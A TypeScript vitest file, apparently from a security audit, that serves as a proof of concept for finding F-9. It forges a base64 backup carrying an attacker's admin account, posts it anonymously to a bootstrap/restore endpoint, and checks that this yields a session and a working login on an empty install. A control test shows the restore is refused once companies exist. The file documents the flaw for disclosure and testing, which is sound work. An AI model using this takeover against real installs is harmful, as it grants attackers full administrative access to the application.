import { describe, it, expect, beforeEach, afterEach, afterAll } from 'vitest';
import { NextRequest } from 'next/server';
import { db } from '@/lib/db';
import { hashPassword } from '@/lib/auth';
import { authRateLimiter } from '@/lib/rate-limiter';
import { POST as bootstrapPOST } from '@/app/api/bootstrap/restore/route';
import { POST as loginPOST } from '@/app/api/auth/login/route';
import { GET as journalGET } from '@/app/api/journal/route';
import { createTestCompany, clearDatabase } from '../helpers/factories';

const log = (...args: unknown[]) => console.log('[EVIDENCE]', ...args);

const FORGED_COMPANY_ID = 'f9-forged-company';
const FORGED_USER_ID = 'f9-forged-user';
const FORGED_EMAIL = 'f9-boot@example.com';
const ATTACKER_PASSWORD = 'AtacantePass1!';

const q4CompanyIds = new Set<string>();

const isBootstrapDb = (process.env.DATABASE_URL ?? '').includes('accountexpress_bootstraptest');

function buildBootstrapRequest(base64Data: string, xff = '10.9.5.1'): NextRequest {
  return new NextRequest('http://localhost/api/bootstrap/restore', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-forwarded-for': xff },
    body: JSON.stringify({ data: base64Data }),
  });
}

function buildLoginRequest(email: string, password: string, xff: string): NextRequest {
  return new NextRequest('http://localhost/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-forwarded-for': xff },
    body: JSON.stringify({ email, password }),
  });
}

describe.skipIf(!isBootstrapDb)('F-9 — Anonymous bootstrap/restore takes over a fresh install (dynamic PoC)', () => {
  beforeEach(async () => {
    authRateLimiter.clear();
    await clearDatabase();
  });

  afterEach(async () => {
    authRateLimiter.clear();
    await db.rateLimit.deleteMany({ where: { key: { startsWith: 'ip:10.9' } } }).catch(() => {});
    await db.rateLimit.deleteMany({ where: { key: { startsWith: 'email:f9-' } } }).catch(() => {});
    const q4Ids = [...q4CompanyIds];
    q4CompanyIds.clear();
    if (q4Ids.length > 0) {
      await db.company.deleteMany({ where: { id: { in: q4Ids } } }).catch(() => {});
    }
    await clearDatabase();
  });

  afterAll(async () => {
    const users = await db.user.count({ where: { email: { contains: '@example.com' } } });
    const sessions = await db.session.count({ where: { user: { email: { contains: '@example.com' } } } });
    log('AFTER-ALL DB STATE: test users =', users, '| test sessions =', sessions);
  });

  async function buildForgedBackupBase64(passwordHash: string, includeSystemBootstrap: boolean): Promise<string> {
    const forgedUsers: Record<string, unknown>[] = [
      {
        id: FORGED_USER_ID,
        email: FORGED_EMAIL,
        passwordHash,
        firstName: 'F9',
        lastName: 'Forged',
        role: 'company_admin',
        isActive: true,
      },
    ];
    if (includeSystemBootstrap) {
      forgedUsers.push({
        id: 'system_bootstrap',
        email: 'sys-boot@example.com',
        passwordHash,
        firstName: 'Sys',
        lastName: 'Boot',
        role: 'company_admin',
        isActive: true,
      });
    }
    const backupData = {
      manifest: {
        version: '1.0',
        companyId: FORGED_COMPANY_ID,
        companyInfo: { id: FORGED_COMPANY_ID, legalName: 'F9 Forged Co', taxId: '12-3456789' },
        createdAt: new Date().toISOString(),
        recordCounts: {
          company: 1, glAccounts: 0, bankAccounts: 0, bankStatements: 0, bankTransactions: 0,
          bankRules: 0, journalEntries: 0, journalLines: 0, fiscalPeriods: 0,
          companyMembers: 1, users: forgedUsers.length, systemConfig: 0, companyConfig: false,
        },
      },
      data: {
        company: [
          {
            id: FORGED_COMPANY_ID,
            legalName: 'F9 Forged Co',
            entityType: 'BUSINESS',
            taxId: '12-3456789',
            isActive: true,
          },
        ],
        users: forgedUsers,
        companyMembers: [
          { id: 'f9-forged-member', userId: FORGED_USER_ID, companyId: FORGED_COMPANY_ID, role: 'company_admin' },
        ],
        glAccounts: [],
        bankAccounts: [],
        bankStatements: [],
        bankTransactions: [],
        bankRules: [],
        journalEntries: [],
        journalLines: [],
        fiscalPeriods: [],
        systemConfig: [],
        companyConfig: null,
      },
    };
    return Buffer.from(JSON.stringify(backupData)).toString('base64');
  }

  it('Q0: on a genuinely empty DB the restore cannot complete without a system_bootstrap user (implicit dependency)', async () => {
    const attackerHash = await hashPassword(ATTACKER_PASSWORD);
    const base64 = await buildForgedBackupBase64(attackerHash, false);
    const companiesBefore = await db.company.count();
    log('Q0-SEEDED: companies in DB before request =', companiesBefore);

    const res = await bootstrapPOST(buildBootstrapRequest(base64), { params: Promise.resolve({}) });
    const body = await res.json();
    log('Q0: bootstrap WITHOUT system_bootstrap user -> status =', res.status, '| error =', JSON.stringify(body.error)?.slice(0, 120));
    expect(res.status).toBe(400);
  });

  it('Q1: an anonymous request with a forged backup is accepted when the DB has no companies', async () => {
    const attackerHash = await hashPassword(ATTACKER_PASSWORD);
    const base64 = await buildForgedBackupBase64(attackerHash, true);
    const companiesBefore = await db.company.count();
    log('Q1-SEEDED: companies in DB before request =', companiesBefore);

    const res = await bootstrapPOST(buildBootstrapRequest(base64), { params: Promise.resolve({}) });
    log('Q1: POST /api/bootstrap/restore (anonymous, forged backup) -> status =', res.status);
    const body = await res.json();
    log('Q1: response success =', body.success, '| restored company =', JSON.stringify(body.companies?.[0]?.legalName));
    expect(companiesBefore).toBe(0);
    expect(res.status).toBe(200);
    expect(body.success).toBe(true);
  });

  it('Q2: the response emits a session for users[0] of the forged backup (auto-login)', async () => {
    const attackerHash = await hashPassword(ATTACKER_PASSWORD);
    const base64 = await buildForgedBackupBase64(attackerHash, true);

    const res = await bootstrapPOST(buildBootstrapRequest(base64), { params: Promise.resolve({}) });
    const token = res.cookies.get('session')?.value;
    const body = await res.json();
    log('Q2: bootstrap status =', res.status, '| session cookie emitted =', Boolean(token), '| authed user =', body.user?.email);
    expect(res.status).toBe(200);
    expect(token).toBeDefined();

    // The emitted session is usable against a protected route
    const journal = await journalGET(
      new NextRequest(`http://localhost/api/journal?companyId=${FORGED_COMPANY_ID}`, {
        method: 'GET',
        headers: { Authorization: `Bearer ${token}` },
      }),
      { params: Promise.resolve({}) },
    );
    log('Q2: GET /api/journal with the bootstrap-issued session ->', journal.status);
    expect(journal.status).toBe(200);
  });

  it('Q3: the forged user can log in with the password hash shipped inside the backup (preserved on bootstrap)', async () => {
    const attackerHash = await hashPassword(ATTACKER_PASSWORD);
    const base64 = await buildForgedBackupBase64(attackerHash, true);

    const bootstrap = await bootstrapPOST(buildBootstrapRequest(base64), { params: Promise.resolve({}) });
    expect(bootstrap.status).toBe(200);

    const login = await loginPOST(
      buildLoginRequest(FORGED_EMAIL, ATTACKER_PASSWORD, '10.9.5.2'),
      { params: Promise.resolve({}) },
    );
    log('Q3: bootstrap status =', bootstrap.status, '| login with password from forged backup ->', login.status);
    expect(login.status).toBe(200);
  });

  it('Q4 (control): the endpoint refuses to restore when the DB already has companies (409)', async () => {
    const attackerHash = await hashPassword(ATTACKER_PASSWORD);
    const base64 = await buildForgedBackupBase64(attackerHash, true);
    const existing = await createTestCompany('Existing Co');
    q4CompanyIds.add(existing.id);
    const companies = await db.company.count();
    log('Q4-SEEDED: companies in DB before request =', companies);

    const res = await bootstrapPOST(buildBootstrapRequest(base64), { params: Promise.resolve({}) });
    const body = await res.json();
    log('Q4: bootstrap with non-empty DB -> status =', res.status, '| code =', body.code);
    expect(res.status).toBe(409);
    expect(body.code).toBe('DB_NOT_EMPTY');
  });
});

